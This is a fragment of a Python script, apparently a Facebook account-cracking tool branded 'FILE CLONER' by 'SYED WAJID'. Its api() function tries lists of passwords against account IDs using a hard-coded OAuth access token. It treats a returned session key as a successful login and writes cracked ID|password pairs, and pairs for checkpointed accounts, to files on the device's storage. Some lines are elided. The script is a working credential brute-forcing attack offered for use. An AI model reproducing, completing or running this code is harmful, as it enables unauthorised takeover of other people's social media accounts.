...
\33[1;96m╚══════╝   ╚═╝   ╚══════╝╚═════╝\033[;37m  
=======================================================
[\33[1;92m+\33[1;37m] OWNER   : SYED WAJID
[\33[1;92m+\33[1;37m] VERSION : 1.1.1
[\33[1;92m+\33[1;37m] TOOL    : FILE CLONER
=======================================================""")
...
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m [WAJID] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(f' ')[0]
                        try:
                                ln = names.split(f' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                head = {
                                        ...
                                        'Authorization':'OAuth EAAGOfOcFdnYBAEYTtJ6jE2s43mw7663VVKEuhSyZAKMlozHqIuPpNHtd37HLx0UgdKtAMMO743b6ecuZB1ZBtfGOXnDuznHZCQ3QGZBZA4YKcVENb4ybTsmFvSGEE6PXixMrOCJu50XY62cbICmow755VXr5e2X2DdrcXFkQJjXHo0xX6ngOkB',
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [WAJID-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/SYED-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[38;5;126m [WAJID-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open(f'/sdcard/SYED-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open(f'/sdcard/WAJID-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
